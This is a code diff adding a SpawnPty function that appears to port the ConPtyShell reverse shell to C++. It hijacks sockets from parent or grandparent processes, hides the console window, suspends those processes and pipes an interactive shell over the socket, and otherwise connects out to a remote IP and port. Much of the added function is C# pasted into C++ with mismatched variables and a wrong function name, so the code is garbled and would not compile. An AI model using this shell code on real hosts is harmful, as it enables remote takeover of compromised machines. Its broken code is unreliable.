@@ -1,11 +1,13 @@
 #include "spawn.h"
 
-DWORD GetParentProcess()
+DWORD GetParentProcessId(DWORD dwProcessId)
 {
     HANDLE hSnapshot;
     PROCESSENTRY32 pe32;
-    DWORD ppid = 0, pid = GetCurrentProcessId();
-
+    DWORD ppid = 0;
+    DWORD pid = dwProcessId;
+    if(pid == 0) 
+        pid = GetCurrentProcessId();
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     __try {
         if (hSnapshot == INVALID_HANDLE_VALUE) __leave;
@@ -20,7 +22,6 @@ DWORD GetParentProcess()
                 break;
             }
         } while (Process32Next(hSnapshot, &pe32));
-
     }
     __finally {
         if (hSnapshot != INVALID_HANDLE_VALUE && hSnapshot != NULL) CloseHandle(hSnapshot);
@@ -251,4 +252,312 @@ HANDLE StartThreadReadSocketWritePipe(HANDLE hPipe, SOCKET hSock, HANDLE hChildP
     params.bOverlapped = bOverlappedSocket;
     HANDLE hThread = CreateThread(0, 0, ThreadReadSocketWritePipe, &params, 0, 0);
     return hThread;
+}
+
+string SpawnPty(DWORD dwRows, DWORD dwCols, CString csCommandLine)
+{
+    HMODULE hKernel32 = LoadLibrary(_T("kernel32.dll"));
+    if (hKernel32 != NULL)
+    {
+        if (GetProcAddress(hKernel32, "CreatePseudoConsole") != NULL)
+        {
+            FreeLibrary(hKernel32);
+            HANDLE hInputPipeRead = NULL;
+            HANDLE hInputPipeWrite = NULL;
+            HANDLE hOutputPipeRead = NULL;
+            HANDLE hOutputPipeWrite = NULL;
+            if (CreatePipes(hInputPipeRead, hInputPipeWrite, hOutputPipeRead, hOutputPipeWrite))
+            {
+                HANDLE hOldStdIn = NULL;
+                HANDLE hOldStdOut = NULL;
+                HANDLE hOldStdErr = NULL;
+                InitConsole(hOldStdIn, hOldStdOut, hOldStdErr);
+                if (InitWSAThread() == 0)
+                {
+                    DWORD dwProcessId = GetCurrentProcessId();
+                    DWORD dwParentProcessId = GetParentProcessId();
+                    DWORD dwGrandParentProcessId = 0;
+                    if (dwParentProcessId != 0)
+                        dwGrandParentProcessId = GetParentProcessId(dwParentProcessId);
+                    // try to duplicate the socket for the current process
+                    bool bOverlapped = false;
+                    bool bParentSocketInherited = false;
+                    bool bGrandParentSocketInherited = false;
+                    SOCKET hSock = DuplicateTargetProcessSocket(dwProcessId, bOverlapped);
+                    if (hSock == INVALID_SOCKET && dwParentProcessId != 0)
+                    {
+                        // if no sockets are found in the current process we try to hijack our current parent process socket
+                        hSock = DuplicateTargetProcessSocket(dwParentProcessId, bOverlapped);
+                        if (hSock == INVALID_SOCKET && dwGrandParentProcessId != 0)
+                        {
+                            // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
+                            hSock = DuplicateTargetProcessSocket(dwGrandParentProcessId, bOverlapped);
+                            if (hSock == INVALID_SOCKET)
+                            {
+                                cerr << _T("No \\Device\\Afd objects found. Socket duplication failed.") << endl;
+                            }
+                            else
+                            {
+                                bGrandParentSocketInherited = true;
+                            }
+                        }
+                        else
+                        {
+                            bParentSocketInherited = true;
+                            // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
+                            if (dwGrandParentProcessId != 0) bGrandParentSocketInherited = IsSocketInherited(hSock, dwGrandParentProcessId);
+                        }
+                    }
+                    else
+                    {
+                        // the current process got a usable socket, let's see if the parents use the socket
+                        if (dwParentProcessId != 0) bParentSocketInherited = IsSocketInherited(hSock, dwParentProcessId);
+                        if (dwGrandParentProcessId != 0) bGrandParentSocketInherited = IsSocketInherited(hSock, dwGrandParentProcessId);
+                    }
+                    if (hSock != INVALID_SOCKET)
+                    {
+                        bool bNewConsoleAllocated = false;
+                        if (GetConsoleWindow() == NULL)
+                        {
+                            AllocConsole();
+                            ShowWindow(GetConsoleWindow(), SW_HIDE);
+                            bNewConsoleAllocated = true;
+                        }
+                        HPCON hPseudoConsole = NULL;
+                        int iPseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(hInputPipeRead, hOutputPipeWrite, dwRows, dwCols, &hPseudoConsole);
+                        if (iPseudoConsoleCreationResult != 0)
+                        {
+                            cerr << _T("ERROR: Could not create pseudo console. Error Code ") << iPseudoConsoleCreationResult << endl;
+                        }
+                        else
+                        {
+                            PROCESS_INFORMATION childProcessInfo;
+                            memset(&childProcessInfo, 0, sizeof(PROCESS_INFORMATION));
+                            if (SUCCEEDED(CreateChildProcessWithPseudoConsole(&hPseudoConsole, csCommandLine, &childProcessInfo)))
+                            {
+                                // Note: We can close the handles to the PTY-end of the pipes here
+                                // because the handles are dup'ed into the ConHost and will be released
+                                // when the ConPTY is destroyed.
+                                if (hInputPipeRead != NULL) CloseHandle(hInputPipeRead);
+                                if (hOutputPipeWrite != NULL) CloseHandle(hOutputPipeWrite);
+
+                                // we need to suspend other processes that can interact with the duplicated sockets if any. 
+                                // This will ensure stdin, stdout and stderr is read/write only by our conpty process
+                                if (bParentSocketInherited || bGrandParentSocketInherited)
+                                {
+                                    HMODULE hNtDll = LoadLibrary(_T("ntdll.dll"));
+                                    if (hNtDll != NULL)
+                                    {
+                                        NtSuspendProcessPtr NtSuspendProcess = (NtSuspendProcessPtr)GetProcAddress(hNtDll, "NtSuspendDll");
+                                        if (NtSuspendProcess != NULL)
+                                        {
+                                            if (bParentSocketInherited)
+                                            {
+                                                NTSTATUS ntStatus = NtSuspendProcess(parentProcess.Handle);
+                                                if (ntStatus != NTSTATUS_SUCCESS)
+                                                {
+                                                    cerr << _T("WARNING: Failed to suspend parent process") << endl;
+                                                }
+                                            }
+                                            if (bGrandParentSocketInherited)
+                                            {
+                                                NTSTATUS ntStatus = NtSuspendProcess(grandParentProcess.Handle);
+                                                if (ntStatus != NTSTATUS_SUCCESS)
+                                                {
+                                                    cerr << _T("WARNING: Failed to suspend grandparent process") << endl;
+                                                }
+                                            }
+                                        }
+                                        else
+                                        {
+                                            cerr << _T("WARNING: Failed to find NtSuspendProcess. Cannot suspend parent or grandparent process") << endl;
+                                        }
+                                        FreeLibrary(hNtDll);
+                                    }
+                                    else
+                                    {
+                                        cerr << _T("WARNING: Failed to load ntdll. Cannot suspend parent or grandparent process") << endl;
+                                    }
+                                }
+                                
+                                if (!bOverlapped) SetSocketBlockingMode(hSock, 1);
+                            }
+                        }
+                        
+                    }
+                    ShutdownWSAThread();
+                }
+                else
+                {
+                    cerr << _T("ERROR: Failed to start WinSock API") << endl;
+                }
+            }
+            else
+            {
+                cerr << _T("ERROR: Failed to create pipes") << endl;
+            }
+        }
+        else
+        {
+            cerr << _T("ERROR: The system doesn't support PseudoConsole API") << endl;
+        }
+    }
+    SOCKET hSock = NULL;
+    HANDLE hInputPipeRead = NULL;
+    HANDLE hInputPipeWrite = NULL;
+    HANDLE hOutputPipeRead = NULL;
+    HANDLE hOutputPipeWrite = NULL;
+    HPCON hPseudoConsole = NULL;
+    HANDLE hOldStdIn = NULL;
+    HANDLE hOldStdOut = NULL;
+    HANDLE hOldStdErr = NULL;
+    bool bNewConsoleAllocated = false;
+    bool bParentSocketInherited = false;
+    bool bGrandParentSocketInherited = false;
+    bool bConptyCompatible = false;
+    bool bIsSocketOverlapped = true;
+    CString output = _T("");
+    HANDLE currentProcess = NULL;
+    HANDLE parentProcess = NULL;
+    HANDLE grandParentProcess = NULL;
+    PROCESS_INFORMATION childProcessInfo;
+    CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
+    // comment the below function to debug errors
+    InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
+    // init wsastartup stuff for this thread
+    InitWSAThread();
+    if (conptyCompatible)
+    {
+        Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
+        if (upgradeShell)
+        {
+            List<IntPtr> socketsHandles = new List<IntPtr>();
+            currentProcess = Process.GetCurrentProcess();
+            parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
+            if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
+            // try to duplicate the socket for the current process
+            shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
+            if (shellSocket == IntPtr.Zero && parentProcess != null)
+            {
+                // if no sockets are found in the current process we try to hijack our current parent process socket
+                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
+                if (shellSocket == IntPtr.Zero && grandParentProcess != null)
+                {
+                    // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
+                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
+                    if (shellSocket == IntPtr.Zero)
+                    {
+                        throw new ConPtyShellException("No \\Device\\Afd objects found. Socket duplication failed.");
+                    }
+                    else
+                    {
+                        grandParentSocketInherited = true;
+                    }
+                }
+                else
+                {
+                    // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
+                    parentSocketInherited = true;
+                    if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
+                }
+            }
+            else
+            {
+                // the current process got a usable socket, let's see if the parents use the socket
+                if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
+                if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
+            }
+        }
+        else
+        {
+            shellSocket = connectRemote(remoteIp, remotePort);
+            if (shellSocket == IntPtr.Zero)
+            {
+                output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
+                return output;
+            }
+            TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
+        }
+        if (GetConsoleWindow() == IntPtr.Zero)
+        {
+            AllocConsole();
+            ShowWindow(GetConsoleWindow(), SW_HIDE);
+            newConsoleAllocated = true;
+        }
+        // debug code for checking handle duplication
+        // Console.WriteLine("debug: Creating pseudo console...");
+        // Thread.Sleep(180000);
+        // return "";
+        int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
+        if (pseudoConsoleCreationResult != 0)
+        {
+            output += string.Format("{0}Could not create psuedo console. Error Code {1}", errorString, pseudoConsoleCreationResult.ToString());
+            return output;
+        }
+        childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
+    }
+    else
+    {
+        if (upgradeShell)
+        {
+            output += string.Format("Could not upgrade shell to fully interactive because ConPTY is not compatible on this system");
+            return output;
+        }
+        shellSocket = connectRemote(remoteIp, remotePort);
+        if (shellSocket == IntPtr.Zero)
+        {
+            output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
+            return output;
+        }
+        Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
+        STARTUPINFO sInfo = new STARTUPINFO();
+        sInfo.cb = Marshal.SizeOf(sInfo);
+        sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
+        sInfo.hStdInput = InputPipeRead;
+        sInfo.hStdOutput = OutputPipeWrite;
+        sInfo.hStdError = OutputPipeWrite;
+        CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
+    }
+    // Note: We can close the handles to the PTY-end of the pipes here
+    // because the handles are dup'ed into the ConHost and will be released
+    // when the ConPTY is destroyed.
+    if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
+    if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
+    if (upgradeShell) {
+        // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
+        if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
+        if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
+        if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 1);
+    }
+    //Threads have better performance than Tasks
+    Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);
+    Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);
+    // wait for the child process until exit
+    WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
+    //cleanup everything
+    thThreadReadPipeWriteSocket.Abort();
+    thReadSocketWritePipe.Abort();
+    if (upgradeShell)
+    {
+        if (!IsSocketOverlapped)
+        {
+            // cancelling the event selection for the socket
+            WSAEventSelect(shellSocket, IntPtr.Zero, 0);
+            SocketHijacking.SetSocketBlockingMode(shellSocket, 0);
+        }
+        if (parentSocketInherited) NtResumeProcess(parentProcess.Handle);
+        if (grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
+    }
+    closesocket(shellSocket);
+    RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
+    if (newConsoleAllocated)
+        FreeConsole();
+    CloseHandle(childProcessInfo.hThread);
+    CloseHandle(childProcessInfo.hProcess);
+    if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
+    if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
+    if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
+    ShutdownWSAThread();
+    output += "ConPtyShell kindly exited.\r\n";
+    return output;
 }
